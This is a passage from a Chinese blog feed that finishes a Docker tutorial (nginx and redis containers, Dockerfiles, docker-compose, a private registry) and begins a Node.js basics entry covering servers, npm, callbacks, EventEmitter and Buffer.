Nginx"></a>Ⅲ、部署 Nginx</h3><ol><li>搜索 nginx 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search nginx<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 nginx 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull nginx<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射、目录映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 在/root目录下创建nginx目录用于存储nginx数据信息</span><br>mkdir ~/nginx<br>cd ~/nginx<br>mkdir conf<br>cd conf<br><span class="hljs-meta">#</span><span class="bash"> 在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span><br>vim nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">user  nginx;<br>worker_processes  1;<br><br>error_log  /var/log/nginx/error.log warn;<br>pid        /var/run/nginx.pid;<br><br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br><br>http &#123;<br>    include       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br><br>    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;<br>                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;<br>                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;<br><br>    access_log  /var/log/nginx/access.log  main;<br><br>    sendfile        on;<br>    #tcp_nopush     on;<br><br>    keepalive_timeout  65;<br><br>    #gzip  on;<br><br>    include /etc/nginx/conf.d/*.conf;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_nginx \<br>-p 80:80 \<br>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \<br>-v $PWD/logs:/var/log/nginx \<br>-v $PWD/html:/usr/share/nginx/html \<br>nginx<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><strong>-p 80:80</strong>：将容器的 80 端口映射到宿主机的 80 端口。</li><li><strong>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</strong>：将主机当前目录下的 /conf/nginx.conf 挂载到容器的 :/etc/nginx/nginx.conf。配置目录</li><li><strong>-v $PWD/logs:/var/log/nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的/var/log/nginx。日志目录</li></ul></li></ul><ol start="4"><li>使用外部机器访问 nginx</li></ol><h3 id="Ⅳ、部署-Redis"><a href="#Ⅳ、部署-Redis" class="headerlink" title="Ⅳ、部署 Redis"></a>Ⅳ、部署 Redis</h3><ol><li>搜索 redis 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search redis<br></code></pre></td></tr></table></figure><ol start="2"><li>拉取 redis 镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull redis:5.0<br></code></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_redis -p 6379:6379 redis:5.0<br></code></pre></td></tr></table></figure><ol start="4"><li>使用外部机器连接 redis</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./redis-cli.exe -h 192.168.149.135 -p 6379<br></code></pre></td></tr></table></figure><h2 id="七、镜像"><a href="#七、镜像" class="headerlink" title="七、镜像"></a>七、镜像</h2><p>为什么一个操作系统的镜像在 Docker 里会很小 因为使用了当前操作系统的 bootfs 拉取下来的只是 rootfs 和往上的镜像层<br>又比如 tomcat 的安装包比镜像小</p><p>linux(bootfs-&gt;rootfs)<br>本质：Docker 的底端是 bootfs 而且是使用的是宿主机的内核 第二层是当前系统的 rootfs 的基础镜像 base image 然后就有软件的编译环境如 jdk 最后暴露在外面的就是软件的镜像 <strong>即分层文件系统</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210408211917032.png"></p><p>对于使用者来说 就是集成了操作系统和编译运行环境的文件系统</p><h2 id="八、压缩文件"><a href="#八、压缩文件" class="headerlink" title="八、压缩文件"></a>八、压缩文件</h2><p>类似于操作系统中 Ghost 把分区克隆为.gho 文件</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210418172617431.png"></p><ol><li>容器转为镜像</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker commit 容器<span class="hljs-built_in">id</span> 镜像名:版本号<br></code></pre></td></tr></table></figure><p>2.压缩镜像</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">docker <span class="hljs-keyword">save</span> -o 压缩文件名 镜像名:版本号<br></code></pre></td></tr></table></figure><p>3.解压出镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> 压缩文件名<br></code></pre></td></tr></table></figure><h2 id="九、Dockerfile"><a href="#九、Dockerfile" class="headerlink" title="九、Dockerfile"></a>九、Dockerfile</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210418172524845.png"></p><p>它是一个记录指令的文本文件 每一条指令构造一层基础镜像(开发) 最终构造成一个完整的发布镜像 这种做法和容器打包为压缩文件不一样 但最终效果一致 都能为开发人员提供一个完全一致的开发环境 有利于多方调试 对于测试人员则直接可以把其 docker run 然后用于工作 对于运维人员则可以在应用部署时实现无缝衔接</p><p>据此，我们可以自定义一个软件(操作系统)安装后就有哪些功能(夹带哪些软件) FROM MAITAINER RUN WORKDIR</p><h3 id="编写-Dockerfile"><a href="#编写-Dockerfile" class="headerlink" title="编写 Dockerfile"></a>编写 Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#案例 刚安装的centos终端输入vim发现不能使用 说明vim并没有被载入centos的镜像中 需要用户自行安装 那么我们可以自定义镜像</span><br><br>①定义父镜像 <span class="hljs-keyword">FROM</span> centos7<br>②定义作者信息 <span class="hljs-keyword">MAINTAINER</span> wo02ie<br>③执行安装软件的命令 <span class="hljs-keyword">RUN</span><span class="bash"> apt-get install vim</span><br><span class="hljs-comment">#还可使用离线安装包 ADD springboot.jar app.jar</span><br><span class="hljs-comment">#CMD jar -jar app.jar</span><br><br>④定义默认工作目录 <span class="hljs-keyword">WORKDIR</span><span class="bash">　／ｕｓｒ</span><br>⑤让容器启动执行命令　<span class="hljs-keyword">CMD</span><span class="bash">　（常是）／ｂｉｎ／ｂａｓｈ</span><br></code></pre></td></tr></table></figure><h3 id="使用-Dockerfile-文件"><a href="#使用-Dockerfile-文件" class="headerlink" title="使用 Dockerfile 文件"></a>使用 Dockerfile 文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker build -f ..<span class="hljs-regexp">/./</span>Dockerfile -t 镜像名 . <span class="hljs-comment">#这个点不能省略 将来工作寻址用</span><br></code></pre></td></tr></table></figure><p>使用 dockerfile 时 image 里没有 vim 但要换 apt-get 源</p><p>在/etc/apt/</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">echo <span class="hljs-string">&quot;&quot;</span>&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful-security main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br><br><span class="hljs-meta">#这里不放其他的 都是网上找的 比较老的源 失效居多 自己再去找其他的源用吧</span><br></code></pre></td></tr></table></figure><p>除了上面这种方法 还有没有其他更简洁的方法呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;要修改的文件 比如sources.list<br>cat &lt;&lt; <span class="hljs-string">EOF &gt; sources.list</span><br><span class="hljs-string">然后就可以输入任何东西 还可以编辑</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span>回车结束<br></code></pre></td></tr></table></figure><h2 id="十、服务编排"><a href="#十、服务编排" class="headerlink" title="十、服务编排"></a>十、服务编排</h2><p>大量服务需要按照一定顺序启动 对服务进行批量管理 就需要使用服务编排</p><p>步骤如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>、同样 创建Dockerfile定义好服务环境<br><span class="hljs-number">2</span>、使用docker-compose.yml定义组成的各个服务<br><span class="hljs-number">3</span>、使用命令docker-compose <span class="hljs-keyword">up</span>启动应用<br></code></pre></td></tr></table></figure><ul><li>docker compose 安装</li></ul><p>github 上面的 docker/compose/release 找到对应版本</p><p>使用 curl -L <a href="https://github.com/docker/compose/release/download/xxx/docker-compose-">https://github.com/docker/compose/release/download/xxx/docker-compose-</a> `uname -s`-`uname -m` -o /usr/local/bin/docker-compose</p><p>chmod +X /usr/local/bin/docker-compose</p><p>docker-compose -version</p><ul><li><p>docker compose 使用<br>进入 docekr-compose 文件下 编辑一个 vim docker-compose.yml<br>编辑服务的一些配置服务<br><del>运维操作</del></p></li><li><p>启动一串服务<br>docker-compose up</p></li></ul><h2 id="十一、Docker-私有仓库"><a href="#十一、Docker-私有仓库" class="headerlink" title="十一、Docker 私有仓库"></a>十一、Docker 私有仓库</h2><p>类似于 Github 但这主要用来保存镜像</p><p><strong>搭建步骤：</strong></p><ul><li><p>拉去私有仓库<br>docker pull registry</p></li><li><p>启动私有仓库<br>docekr run -id –name=registry -p 5000:5000 registry</p></li><li><p>访问私有仓库<br>http://本地私有仓库ip:5000/v2/_catalog</p></li></ul><p>访问到一个 json 字符串 说明搭建成功</p><ul><li>编辑加速器文件<br>将私有仓库添加到加速器 vim /etc/docker/daemon.json</li></ul><p>追加：”insecure=registries”:[“本地仓库地址:5000”]</p><ul><li>重启 docker 服务<br>systemctl restart docker</li></ul><p><strong>上传镜像到私有仓库：</strong></p><ul><li><p>添加标记：<br>docker tag 本地镜像名 本地私有仓库 ip:5000/镜像名</p></li><li><p>启动 registry 容器<br>docker start registry</p></li><li><p>上传<br>docker push 本地私有仓库/镜像名</p></li><li><p>从私有仓库拉取镜像<br>docker pull 本地私有仓库 ip:5000/镜像名</p></li></ul><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>docker 容器虚拟化与传统虚拟机比较</p><p>将软件和软件运行环境进行打包 便于开发交付部署</p><p>容器虚拟化的是操作系统/软件 虚拟机虚拟机化的是硬件</p><p>虚拟机可以运行不同的操作系统 容器只能寄生于一个操作系统</p><p><del>虚拟机已死 容器才是未来</del></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs&amp;原型链污染</title>
    <link href="/2021/04/27/nodejs&amp;Prototype-Pollution-Attack/"/>
    <url>/2021/04/27/nodejs&amp;Prototype-Pollution-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>：</p><ul><li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li><li><code>DOM</code>（一些操作页面元素的方法）</li><li><code>BOM</code>（一些操作浏览器的方法）</li></ul><p>上面是<code>JavaScript</code>的组成部分，那么<code>Nodejs</code>呢？</p><p><strong>Nodejs</strong>：</p><ul><li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li><li><code>os</code>(操作系统)</li><li><code>file</code>(文件系统)</li><li><code>net</code>(网络系统)</li><li><code>database</code>(数据库)</li></ul><p>简单的说 Node.js 就是运行在服务端的 JavaScript。</p><p>Node.js 是一个基于 Chrome JavaScript 运行时建立的一个平台。</p><p>Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。</p><p>安装、环境配置略</p><h2 id="一、运行脚本"><a href="#一、运行脚本" class="headerlink" title="一、运行脚本"></a>一、运行脚本</h2><p>（ 略）<br>目的：编写简单的一个脚本并运行 了解 nodejs</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hello world!&quot;</span>) <span class="hljs-meta">#保存为helloworld.js文件</span><br></code></pre></td></tr></table></figure><p>终端到此目录，<code>node helloworld.js</code></p><p>查找命令 node -h</p><h2 id="二、web-服务器"><a href="#二、web-服务器" class="headerlink" title="二、web 服务器"></a>二、web 服务器</h2><p>使用 php 编写后端代码后 部署需要 Apache 或 Nginx 并且要有 mod_php 和 php_cgi 才能成功解析 php</p><p>nodejs 不仅能充当上述服务器的作用 还能实现一个应用</p><p>就上例而言 nodejs 的应用由 http 模块、服务器、处理请求和发送响应</p><h3 id="①-引入模块"><a href="#①-引入模块" class="headerlink" title="① 引入模块"></a>① 引入模块</h3><p>使用 require 载入 http 模块 把实例化的 HTTP 服务赋值给变量 http 其中 require 是 nodejs 自带的 http 模块<br><code>var http = require(&quot;http&quot;);</code></p><h3 id="②-创建服务器"><a href="#②-创建服务器" class="headerlink" title="② 创建服务器"></a>② 创建服务器</h3><p>在 http 模块中提供一函数 creatServer，函数会返回一个对象 可以通过 listen 的方法截获</p><p>http.creatServe()方法创建服务器 listen 8080<br>在里面使用 request 和 response 来接收和响应</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//httpserver.js</span><br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">request,response</span>)</span>&#123;<br>    response.writeHead(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<span class="hljs-comment">//http头 状态码 内容类型</span><br>    response.end(<span class="hljs-string">&quot;The js had been called!\n&quot;</span>)<br>&#125;).listen(<span class="hljs-number">8080</span>)<span class="hljs-comment">//监听8080端口</span><br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)<br></code></pre></td></tr></table></figure><p>配合 index.html</p><h2 id="三、npm"><a href="#三、npm" class="headerlink" title="三、npm"></a>三、npm</h2><p>npm 是 nodejs 的包管理工具 新版的 nodejs 已经带有 npm<br>但通常要升级<code>npm install npm -g(全局安装)</code><br>也需要配置镜像<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>安装模块分为本地安装和全局安装</p><ul><li><p>本地安装</p><ol><li>将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</li><li>可以通过 require() 来引入本地安装的包。</li></ol></li><li><p>全局安装</p><ol><li>将安装包放在 /usr/local 下或者你 node 的安装目录。</li><li>可以直接在命令行里使用。</li></ol></li></ul><p>卸载<code>npm uninstall npm</code><br>升级<code>npm update npm</code><br>查看安装信息<code>npm list -g</code><br>搜索模块<code>npm search npm</code></p><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><p>首先来看一个包的 json 位于 node_modules/npm 的 package.json<br>可以看到有</p><pre><code>name - 包名。version - 包的版本号。description - 包的描述。homepage - 包的官网 url 。author - 包的作者姓名。contributors - 包的其他贡献者姓名。dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。main - main 字段指定了程序的主入口文件，require(&#39;moduleName&#39;) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。keywords - 关键字</code></pre><p>npm init(目录下无 package.json 否则会修改当前的 package.json 文件)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/npminit.png"></p><p>接着使用 npm 来发布模块(不演示)</p><ul><li><input checked="" disabled="" type="checkbox"> 首先在 npm 资源库注册用户<code>npm adduser</code></li><li><input checked="" disabled="" type="checkbox"> 发布<code>npm publish</code></li></ul><h2 id="四、REPL-nodejs-解释器"><a href="#四、REPL-nodejs-解释器" class="headerlink" title="四、REPL nodejs 解释器"></a>四、REPL nodejs 解释器</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/PERl.png"><br>查看 REPL 命令 <code>.help</code></p><p>可以不声明变量 但会直接输出<br>_下划线可以截取上一表达式的运算结果<br>可以键入变量名输出值 也能使用 console.log 函数<br>node 中 ctrl+c 一次退出当前 两次退出解释器 ctrl+d 直接退出解释器</p><h2 id="五、回调函数与事件循环"><a href="#五、回调函数与事件循环" class="headerlink" title="五、回调函数与事件循环"></a>五、回调函数与事件循环</h2><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>先来看两个例子</p><ul><li>阻塞 1.js</li></ul><p><code>var data = fs.readFileSync(&#39;input.txt&#39;);</code></p><p>读取完文件 执行程序</p><ul><li>非阻塞 2.js</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) return console.error(err);<br>    console.log(data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>读取文件的同时执行后面的代码 因此提高了程序的性能 从而我们可以把需要处理回调函数的参数写在回调函数内</p><p>即 <strong>阻塞是按顺序执行代码的 非阻塞可以不按照顺序执行</strong></p><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p>Node.js 异步编程的直接体现就是回调。</p><p>异步编程依托于回调来实现 但不能说使用了回调后程序就异步化了</p><p>nodejs 是单线程应用程序 而 V8 引擎提供的异步执行回调接口就可以处理大量的并发 从而极大的提升了性能</p><p>nodejs 的几乎每个 API 接口都支持回调函数 所有事件均是上帝视角 当事件被检测到就会触发回调函数<br>Node.js 使用事件驱动模型，webserver 一直接收请求而不等待读写操作（非阻塞式 IO 或事件驱动 IO） 然后去服务下一个 web 请求 当这个请求完成 它被放回处理队列 当到达队列开头 这个结果被返回给用户 这种模型非常高效可扩展性也非常强<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/event_loop.jpg"></p><p>回到开头的引言 我们了解了回调函数以及事件循环 就能执行异步操作了<br>下面是 将执行异步操作的函数写在回调函数的最后一个参数中 回调函数接收错误对象则作为第一个参数</p><p>执行 3.js-&gt;删除 input.txt-&gt;执行 3.js</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>);<br><br>fs.readFile(&#x27;<span class="hljs-keyword">input</span>.txt&#x27;, function (<span class="hljs-keyword">err</span>, data) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">err</span>)&#123;<br>      console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>.<span class="hljs-keyword">stack</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   console.<span class="hljs-built_in">log</span>(data.<span class="hljs-keyword">toString</span>());<br>&#125;);<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;程序执行完毕&quot;</span>);<br></code></pre></td></tr></table></figure><p>readFile 函数读取文件，如果在读取文件过程中发生错误，错误 err 对象就会输出错误信息。<br>如果没发生错误，readFile 跳过 err 对象的输出，文件内容就通过回调函数输出，此时就是一次异步操作。</p><h2 id="六、EventEmitter"><a href="#六、EventEmitter" class="headerlink" title="六、EventEmitter"></a>六、EventEmitter</h2><p>events 模块只提供 events.EventEmitter,它是事件触发和事件监听的封装 EventEmitter 对象中有多个属性 on 绑定事件函数 emit 属性触发事件</p><p>event.js EventEmitter 用法</p><p>event1.js 体现如下</p><p>EventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。</p><p>当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/EventEmitter.png"></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>event 实例.js 了解其他属性方法…</p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>一个事件发生错误时没有监听器时会报错 一般要对其设置 error 事件的监听器</p><h2 id="七、Buffer"><a href="#七、Buffer" class="headerlink" title="七、Buffer"></a>七、Buffer</h2><p>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</p><p>但在处理像 TCP 流或文件流时，必须使用到二进制数据。因此在 Node.js 中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const buf = Buffer.<span class="hljs-keyword">from</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>);<br><br><span class="hljs-comment">// 输出 72756e6f6f62</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><span class="hljs-comment">// 输出 cnVub29i</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure><p>目前支持的字符编码 ascii、utf8、utf16le、ucs2 - utf16le、base64、latin1、binary - latin1、hex</p><p>写入缓冲区</p><blockquote><p>buf.write(string[, offset[, length]][, encoding])</p></blockquote><p>从缓冲区读取</p><blockquote><p>buf.toString([encoding[, start[, end]]])</p></blockquote><p>将 buffer 转换为 json 对象</p><blockquote><p>buf.toJSON()</p></blockquote><p>合并缓冲区</p><blockquote><p>Buffer.concat(list[, totalLength])</p></blockquote><p>比较缓冲区</p><blockquote><p>buf.compare(otherBuffer);</p></blockquote><p>拷贝缓冲区</p><blockquote><p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p></blockquote><p>裁剪缓冲区</p><blockquote><p>buf.slice([start[, end]])</p></blockquote><p>计算缓冲区长度</p><blockquote><p>buf.length;</p></blockquote><h2 id="八、模块系统"><a href="#八、模块系统" class="headerlink" title="八、模块系统"></a>八、模块系统</h2><p>前面介绍过了 引入模块使用 require+模块文件<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/require.jpg"><br>require 接收 http、fs 等原生模块以及某路径下的文件模块，还有 mod 非原生模块</p><p>注意：require()不是全局的！</p><h2 id="九、函数"><a href="#九、函数" class="headerlink" title="九、函数"></a>九、函数</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(word) &#123;<br>  console.log(word);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(someFunction, value) &#123;<br>  someFunction(value);<br>&#125;<br><br>execute(say, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p>say 是一个函数 execute 函数的第一个参数就是 say 本身(不是它的返回值) 而 say 中有一个参数 所以用本地变量 someFunction 来传递变量</p><ul><li>匿名函数<br>一般我们函数使用是先声明后定义使用<br>即使我们不急着定义函数体 但在对应域前必须声明了 我们才能调用 而这我们可在函数体内——在参数表中使用本地变量 someFunction 在函数体内直接使用 甚至都不用给函数名字</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span><span class="hljs-params">(someFunction, value)</span></span> &#123;<br>  someFunction(value);<br>&#125;<br><br><span class="hljs-built_in">execute</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(word)</span></span>&#123; console.<span class="hljs-built_in">log</span>(word) &#125;, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="十、路由"><a href="#十、路由" class="headerlink" title="十、路由"></a>十、路由</h2><p>url 请求 GET POST 参数在前面搭建简单应用时没有提及 作为后端处理这些请求就要有相应的服务器的功能<br>router 下有个 index.js 文件 里面可以设置数据库 引入其他模块 同样可以写一个服务的 serve.js 引入 http url 等模块 启动后充当服务器<br>然后用到一个 router.js 的文件 写一个路由函数作为参数传给 server.js<br>至此可以访问 url</p><h2 id="十一、全局变量"><a href="#十一、全局变量" class="headerlink" title="十一、全局变量"></a>十一、全局变量</h2><p>列出一丢丢：</p><p>_filename 当前脚本文件名 输出其绝对路径</p><p>_dirname 当前脚本所在路径</p><p>setTimeout(function(),ms) 全局函数 在指定毫秒后执行一次函数</p><p>clearTimeout(t) 清除 setTimeout()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 两秒后执行以上函数</span><br><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">setTimeout</span>(printHello, <span class="hljs-number">2000</span>);<br><br><span class="hljs-comment">// 清除定时器</span><br><span class="hljs-built_in">clearTimeout</span>(t);<br></code></pre></td></tr></table></figure><p>setlnterval(function(),ms)<br>clearlnterval(t)<br>和上面的两个一样 不同的是 setlntercal 会一直调用函数 直至 clearlnterval 调用或窗口关闭</p><p>process 是 global 